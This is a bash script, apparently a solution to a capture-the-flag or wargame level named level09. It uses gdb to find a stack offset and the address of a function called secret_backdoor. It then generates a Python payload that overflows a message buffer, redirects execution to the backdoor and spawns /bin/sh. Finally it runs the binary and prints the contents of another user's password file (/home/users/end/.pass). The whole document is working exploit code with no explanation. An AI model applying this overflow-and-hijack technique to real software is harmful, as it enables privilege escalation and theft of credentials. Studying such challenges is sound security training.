#!/bin/bash

function buildExploit {
    (cd /tmp; exec gdb -q ~/level09) > /tmp/gdbout09 <<- EOI
		b*handle_msg+80
		run
		info frame
		info function secret_backdoor
		p "rbp-0xc0"
		p \$rbp-0xc0
		quit
	EOI

	set -x
    BACKDOOR_ADDR=`cat /tmp/gdbout09 | grep -o "0x.*backdoor" | cut -d' ' -f1`

    EIP_ADDR=`grep "rip at" /tmp/gdbout09 | rev | cut -d' ' -f 1 | rev`
    MSG_ADDR=`grep -A1 "rbp-0xc0" /tmp/gdbout09 | awk 'END{print}' | awk '{print $NF}'`

    EIP_OFFSET=$(( $EIP_ADDR - $MSG_ADDR ))

	MSG_LEN=$(( $EIP_OFFSET + 8 ))

	python <<- EOI > /tmp/exploit09
		import struct

		msg_len_hex = struct.pack('B', int('$MSG_LEN', 10))
		backdoor_addr_lilend = struct.pack('<q', int('$BACKDOOR_ADDR', 16))

		print 'A' * 40 + msg_len_hex
		print 'B' * $EIP_OFFSET + backdoor_addr_lilend
		print '/bin/sh'
	EOI
}

buildExploit
(cat /tmp/exploit09 - | ~/level09) << EOI
    echo "\nwhoami: \$(whoami)"
    echo "Next pass is:  \$(cat /home/users/end/.pass)\n"
EOI
